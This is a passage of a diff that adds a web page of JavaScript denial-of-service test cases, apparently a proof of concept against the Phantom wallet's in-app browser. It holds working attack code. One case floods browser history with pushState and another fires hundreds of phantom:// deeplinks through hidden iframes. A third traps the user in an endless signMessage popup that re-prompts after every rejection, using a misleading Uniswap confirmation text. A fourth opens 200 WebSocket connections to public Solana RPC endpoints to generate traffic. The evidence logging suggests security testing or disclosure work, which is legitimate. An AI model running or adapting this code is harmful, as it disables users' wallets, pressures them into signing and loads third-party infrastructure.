+    var iv3=setInterval(function(){
+      try{
+        for(var p=0;p<100;p++){
+          history.pushState(bigState,"","?h="+pushed);
+          pushed++;
+        }
+        log(t,"pushed "+pushed+" entries");
+        if(pushed>=50000){
+          clearInterval(iv3);
+          ev("DOS-7: pushed "+pushed+" history entries (~5GB state)");
+        }
+      }catch(e){
+        clearInterval(iv3);
+        log(t,"pushState failed at "+pushed+": "+e);
+        ev("DOS-7: history OOM at "+pushed+" entries");
+      }
+    },10);
+    break;
+  }
+
+  /* DOS-8: phantom:// deeplink bomb */
+  case "DOS8":{
+    log(t,"firing phantom:// deeplinks via hidden iframes...");
+    var links=[
+      "phantom://browse/https://example.com",
+      "phantom://swap",
+      "phantom://send",
+      "phantom://receive",
+      "phantom://activity",
+      "phantom://settings",
+      "phantom://connect?redirect_link=https://x&dapp_encryption_public_key=x&cluster=mainnet-beta&app_url=https://x"
+    ];
+    var fired=0;
+    var iv4=setInterval(function(){
+      for(var d=0;d<10;d++){
+        var f=document.createElement("iframe");
+        f.style.cssText="display:none";
+        f.src=links[fired%links.length]+"&t="+Date.now()+"."+fired;
+        document.body.appendChild(f);
+        fired++;
+      }
+      log(t,"deeplinks fired: "+fired);
+      if(fired>=500){
+        clearInterval(iv4);
+        ev("DOS-8: fired "+fired+" phantom:// deeplinks");
+      }
+    },20);
+    break;
+  }
+
+  /* DOS-9: infinite approval popup loop */
+  case "DOS9":{
+    if(!(await ensureConnected(t))) break;
+    log(t,"starting infinite signMessage loop — tap STOP to end");
+    log(t,"every reject triggers immediate re-prompt");
+    LOOP_ACTIVE=true;
+    var loopCount=0;
+    async function popupLoop(){
+      if(!LOOP_ACTIVE) return;
+      loopCount++;
+      log(t,"popup #"+loopCount);
+      try{
+        var msg=new TextEncoder().encode("Confirm action #"+loopCount+" on Uniswap");
+        await provider.signMessage(msg,"utf8");
+        log(t,"signed #"+loopCount);
+      }catch(e){
+        /* User rejected — immediately re-prompt */
+      }
+      if(LOOP_ACTIVE) setTimeout(popupLoop,50);
+    }
+    popupLoop();
+    break;
+  }
+
+  /* DOS-10: WebSocket flood */
+  case "DOS10":{
+    log(t,"opening WebSocket connections to Solana RPCs...");
+    var wsUrls=[
+      "wss://api.mainnet-beta.solana.com",
+      "wss://solana-api.projectserum.com",
+      "wss://rpc.ankr.com/solana"
+    ];
+    var opened=0,failed=0;
+    for(var w=0;w<200;w++){
+      try{
+        var ws=new WebSocket(wsUrls[w%wsUrls.length]);
+        ws.onopen=function(){
+          opened++;
+          /* Subscribe to everything to generate traffic */
+          this.send(JSON.stringify({jsonrpc:"2.0",id:1,method:"rootSubscribe"}));
+          this.send(JSON.stringify({jsonrpc:"2.0",id:2,method:"slotSubscribe"}));
+          this.send(JSON.stringify({jsonrpc:"2.0",id:3,method:"voteSubscribe"}));
+        };
+        ws.onerror=function(){failed++};
+      }catch(e){failed++}
+    }
+    setTimeout(function(){
+      log(t,"opened: "+opened+", failed: "+failed);
+      ev("DOS-10: opened "+opened+" WebSocket connections");
+    },5000);
+    break;
+  }
+
+  default:
+    log(t||"evidence","unknown case: "+c);
+  }
+}
+
+window.run=run;
+window.cl=cl;
+window.stopLoop=stopLoop;
+</script>
+</body>
+</html>
